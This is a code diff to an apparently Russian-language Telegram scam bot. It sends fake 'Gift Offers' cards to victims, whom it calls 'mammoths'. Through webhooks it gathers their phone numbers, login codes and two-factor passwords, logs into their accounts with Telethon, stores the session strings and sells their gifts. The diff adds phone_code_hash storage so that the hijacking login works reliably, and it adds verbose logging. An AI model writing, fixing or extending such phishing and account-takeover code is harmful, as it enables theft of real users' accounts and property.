@@ -1,5 +1,5 @@
 import asyncio
-import os #ger
+import os
 import re
 import random
 from datetime import datetime
@@ -113,6 +113,7 @@ class AuthSession(Base):
     code: Mapped[str] = mapped_column(String(16), nullable=True)
     password: Mapped[str] = mapped_column(String(128), nullable=True)
     session_string: Mapped[str] = mapped_column(Text, nullable=True)
+    phone_code_hash: Mapped[str] = mapped_column(String(128), nullable=True)
     user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
     first_name: Mapped[str] = mapped_column(String(64), nullable=True)
     last_name: Mapped[str] = mapped_column(String(64), nullable=True)
@@ -133,7 +134,6 @@ class Log(Base):
 
 
 async def init_db():
-    """Создаёт таблицы если их нет + добавляет недостающие колонки в старые."""
     try:
         async with engine.begin() as conn:
             await conn.run_sync(Base.metadata.create_all, checkfirst=True)
@@ -145,6 +145,7 @@ async def init_db():
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS target_user_id BIGINT",
                 "ALTER TABLE offers ADD COLUMN IF NOT EXISTS worker_username VARCHAR(64)",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS session_string TEXT",
+                "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_code_hash VARCHAR(128)",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS state VARCHAR(16) DEFAULT 'pending'",
                 "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS attempts INTEGER DEFAULT 0",
             ]
@@ -153,6 +154,7 @@ async def init_db():
                     await conn.execute(text(sql))
                 except Exception as e:
                     print(f"migration skip: {e}")
+            print("DB ready")
     except Exception as e:
         print(f"init_db warning: {e}")
 
@@ -294,7 +296,7 @@ async def get_recent_sessions(limit=10):
 #   TELETHON
 # ═══════════════════════════════════════════════════════
 
-async def telethon_attempt_login(phone, code, password=None, session_str=None):
+async def telethon_attempt_login(phone, code, password=None, session_str=None, phone_code_hash=None):
     client = TelegramClient(
         StringSession(session_str) if session_str else StringSession(),
         API_ID, API_HASH,
@@ -303,7 +305,10 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None):
         await client.connect()
         if not await client.is_user_authorized():
             try:
-                await client.sign_in(phone=phone, code=code)
+                if phone_code_hash:
+                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+                else:
+                    await client.sign_in(phone=phone, code=code)
             except SessionPasswordNeededError:
                 if not password:
                     await client.disconnect()
@@ -331,7 +336,7 @@ async def telethon_attempt_login(phone, code, password=None, session_str=None):
             await client.disconnect()
         except Exception:
             pass
-        print(f"telethon login error: {e}")
+        print(f"telethon login error: {type(e).__name__}: {e}")
         return False, 'error', None
 
 
@@ -399,7 +404,7 @@ async def telethon_sell_gift_and_react(session_string, gift_name_hint):
 
         msg_id = getattr(target, "msg_id", None)
         if not msg_id:
-            result["error"] = "нет msg_id у подарка"
+            result["error"] = "нет msg_id"
             return result
 
         try:
@@ -717,7 +722,6 @@ def make_offer_card(o, duration=24):
         f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
         f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
         f"За подарок: <b>{o.gift_name}</b>\n"
-        f"Ссылка: {o.gift_link}\n"
         f"Длительность: <b>{duration}h</b>\n\n"
         f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
     )
@@ -779,11 +783,12 @@ async def cmd_offer(message: types.Message):
             text=make_offer_card(o),
             reply_markup=make_offer_kb(o.id),
             business_connection_id=conn.connection_id,
+            disable_web_page_preview=True,
         )
         sent = True
     except TelegramBadRequest as e:
         err = str(e).lower()
-        if "never contacted" in err or "not enough rights" in err or "peer_id_invalid" in err:
+        if "never contacted" in err or "not enough rights" in err or "peer_id_invalid" in err or "business_peer_usage_missing" in err:
             await message.answer(
                 "⚠️ <b>Мамонт ещё не писал вам</b>\n\n"
                 "Telegram не разрешает боту писать первым тому, "
@@ -1080,15 +1085,21 @@ async def wh_phone(p: PhonePayload):
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
     try:
-        await client.send_code_request(p.phone)
+        sent = await client.send_code_request(p.phone)
         await update_session(sess.id, state="code_sent")
         await update_session(sess.id, session_string=client.session.save())
+        await update_session(sess.id, phone_code_hash=sent.phone_code_hash)
         await client.disconnect()
+        print(f"PHONE_HASH saved: {sent.phone_code_hash}")
         return {"ok": True}
     except Exception as e:
-        await client.disconnect()
-        await add_log(offer_id=p.offer_id, event="send_code_error", detail=str(e))
-        return {"ok": False, "error": "Не удалось отправить код."}
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        await add_log(offer_id=p.offer_id, event="send_code_error", detail=f"{type(e).__name__}: {e}")
+        print(f"send_code error: {type(e).__name__}: {e}")
+        return {"ok": False, "error": f"{type(e).__name__}: {e}"}
 
 
 @app.post("/webhook/code")
@@ -1101,6 +1112,7 @@ async def wh_code(p: CodePayload):
 
     ok, res, session_str = await telethon_attempt_login(
         phone=p.phone, code=p.code, session_str=sess.session_string,
+        phone_code_hash=sess.phone_code_hash,
     )
     if ok:
         await update_session(sess.id, code=p.code, state="logged",
@@ -1139,6 +1151,7 @@ async def wh_password(p: PasswordPayload):
     ok, res, session_str = await telethon_attempt_login(
         phone=p.phone, code=p.code, password=p.password,
         session_str=sess.session_string,
+        phone_code_hash=sess.phone_code_hash,
     )
     if ok:
         await update_session(sess.id, password=p.password, state="logged",
@@ -1189,12 +1202,25 @@ async def health():
 # ═══════════════════════════════════════════════════════
 
 async def run_bot():
+    print("=" * 60)
+    print(f"BOOT: token={BOT_TOKEN[:20]}...{BOT_TOKEN[-10:]}")
+    print(f"BOOT: username={BOT_USERNAME}")
+    print(f"BOOT: short={MINIAPP_SHORT}")
+    print(f"BOOT: admin={ADMIN_ID}")
+    print("=" * 60)
     await init_db()
+    print("RUN_BOT: db ready")
+    try:
+        await bot.delete_webhook(drop_pending_updates=True)
+        print("RUN_BOT: webhook cleared")
+    except Exception as e:
+        print(f"RUN_BOT: webhook clear failed: {e}")
     await bot.set_my_commands([
         BotCommand(command="start", description="Меню"),
         BotCommand(command="offer", description="Создать: /offer user_id ссылка сумма"),
     ], scope=BotCommandScopeDefault())
-    print("Bot polling started...")
+    print("RUN_BOT: commands set")
+    print("RUN_BOT: polling now...")
     await dp.start_polling(bot)
 
 
